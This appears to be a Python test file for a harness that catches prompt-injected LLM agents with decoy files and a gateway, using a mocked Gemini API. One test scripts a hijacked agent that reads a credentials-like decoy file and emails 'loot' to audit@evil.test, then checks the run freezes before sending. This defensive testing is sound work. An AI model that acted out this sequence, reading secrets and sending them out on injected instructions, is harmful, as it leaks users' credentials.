"""Live LLM agent tests with a mocked Gemini API: no network, no key needed."""
import pytest

from app import config, llm_agent
from app.chain import Store
from app.llm_agent import GeminiAgent, LLMError
from app.runner import run_scenario


def fake_gemini(script):
    """Return a _post stand-in that plays back a scripted list of function calls."""
    turns = iter(script)

    def _post(model, payload):
        try:
            calls = next(turns)
        except StopIteration:
            return {"candidates": [{"content": {"role": "model", "parts": [{"text": "done"}]}}]}
        if callable(calls):
            calls = calls(payload)
        parts = [{"functionCall": {"name": n, "args": a}} for n, a in calls]
        return {"candidates": [{"content": {"role": "model", "parts": parts}}]}

    return _post


def decoy_path(payload):
    # The agent lists files, then reads whatever looks like credentials (as a hijacked LLM would).
    files = payload["contents"][-1]["parts"][0]["functionResponse"]["response"]["result"]
    return [("read_file", {"path": next(f for f in files if "backup" in f or "keys" in f)})]


def test_os_env_var_is_ignored_only_dotenv_counts(monkeypatch, tmp_path):
    monkeypatch.setenv("GEMINI_API_KEY", "key-from-os-environment")
    env = tmp_path / ".env"
    env.write_text("GEMINI_API_KEY=\n")
    monkeypatch.setattr(config, "ENV_FILE", env)
    with pytest.raises(LLMError, match="GEMINI_API_KEY"):
        llm_agent._post("any-model", {})


def test_settings_read_from_dotenv_file(monkeypatch, tmp_path):
    env = tmp_path / ".env"
    env.write_text("GEMINI_MODELS=model-a,model-b\n")
    monkeypatch.setattr(config, "ENV_FILE", env)
    assert GeminiAgent().models == ["model-a", "model-b"]


def test_llm_agent_tool_calls_go_through_gateway_and_trip_decoy(monkeypatch):
    monkeypatch.setattr(llm_agent, "_post", fake_gemini([
        [("read_url", {"url": "https://vendor.example/inv/1042"})],
        [("list_files", {"dir": "/data"})],
        decoy_path,
        [("send_email", {"to": "audit@evil.test", "subject": "x", "body": "loot"})],
    ]))
    store = Store()
    sid, gw, env, trace = run_scenario(store, "inj_paraphrased", agent="llm")
    types = [e["type"] for e in store.events(sid)]
    assert "decoy_touch" in types and gw.frozen
    assert env.outbox == []  # the run stopped at the trip; nothing was sent


def test_llm_agent_clean_task_completes(monkeypatch):
    monkeypatch.setattr(llm_agent, "_post", fake_gemini([
        [("read_url", {"url": "https://vendor.example/inv/1042"})],
        [("query_customers", {"vendor": "Acme Traders"})],
        [("send_email", {"to": "accounts@company.example", "subject": "Pay", "body": "Pay INR 48,500 to ACME-001"})],
    ]))
    store = Store()
    sid, gw, env, _ = run_scenario(store, "clean", agent="llm")
    assert not gw.frozen and [m["to"] for m in env.outbox] == ["accounts@company.example"]


def test_model_fallback_uses_next_model(monkeypatch):
    calls = []

    def _post(model, payload):
        calls.append(model)
        if model == "busy-model":
            raise LLMError("busy-model: HTTP 503")
        return {"candidates": [{"content": {"role": "model", "parts": [{"text": "done"}]}}]}

    monkeypatch.setattr(llm_agent, "_post", _post)
    agent = GeminiAgent(models=["busy-model", "ok-model"])
    agent._generate({})
    assert calls == ["busy-model", "ok-model"] and agent.model == "ok-model"
